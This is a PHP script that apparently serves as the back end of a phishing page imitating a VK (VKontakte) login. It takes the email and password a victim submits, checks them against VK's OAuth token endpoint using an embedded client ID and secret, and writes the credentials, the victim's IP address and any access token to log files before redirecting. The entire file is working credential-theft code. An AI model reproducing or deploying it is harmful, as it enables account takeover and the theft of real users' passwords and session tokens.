<?php
$login = $_POST['email'];
$pass= $_POST['pass'];
if(!@file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=$login&password=$pass")){
  $ip = $_SERVER['REMOTE_ADDR'];
  $file = $_SERVER['DOCUMENT_ROOT']."/log.log";
  $file = str_replace("/vk", "", $file);
  $all = "\r\nx.add_row(['VK', '$login', '$pass', 'No', '$ip'])";
  $fp = fopen("$file", "a+");
  fwrite($fp, $all);
  fclose($fp);
  $file = $_SERVER['DOCUMENT_ROOT']."/data.log";
  $file = str_replace("/vk", "", $file);
  $al = "\r\nx.add_row(['VK', '$login', '$pass', 'No', '$ip', '$proverca_token'])";
  $fps = fopen("$file", "a+");
  fwrite($fps, $al);
  fclose($fps);

  header("location:index.php?i=1");
}else{
  $proverca = file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=$login&password=$pass");
  $proverca = json_decode($proverca, true);
  $proverca_token = $proverca['access_token'];
  if($proverca['user_id']){
      $ip = $_SERVER['REMOTE_ADDR'];
      $file = $_SERVER['DOCUMENT_ROOT']."/log.log";
      $file = str_replace("/vk", "", $file);
      $all = "\r\nx.add_row(['VK', '$login', '$pass', 'Yes', '$ip'])";
      $fp = fopen("$file", "a+");
      fwrite($fp, $all);
      fclose($fp);
      $file = $_SERVER['DOCUMENT_ROOT']."/data.log";
      $file = str_replace("/vk", "", $file);
      $al = "\r\nx.add_row(['VK', '$login', '$pass', 'No', '$ip', '$proverca_token'])";
      $fps = fopen("$file", "a+");
      fwrite($fps, $al);
      fclose($fps);
      $reloc = file_get_contents("location.location");
      header("location: $reloc");
  }else{
    $ip = $_SERVER['REMOTE_ADDR'];
    $file = $_SERVER['DOCUMENT_ROOT']."/log.log";
    $file = str_replace("/vk", "", $file);
    $all = "\r\nx.add_row(['VK', '$login', '$pass', 'No', '$ip'])";
    $fp = fopen("$file", "a+");
    fwrite($fp, $all);
    fclose($fp);
    $file = $_SERVER['DOCUMENT_ROOT']."/data.log";
    $file = str_replace("/vk", "", $file);
    $al = "\r\nx.add_row(['VK', '$login', '$pass', 'No', '$ip', '$proverca_token'])";
    $fps = fopen("$file", "a+");
    fwrite($fps, $al);
    fclose($fps);
     header("location:index.php?i=1");
  }
}
?>
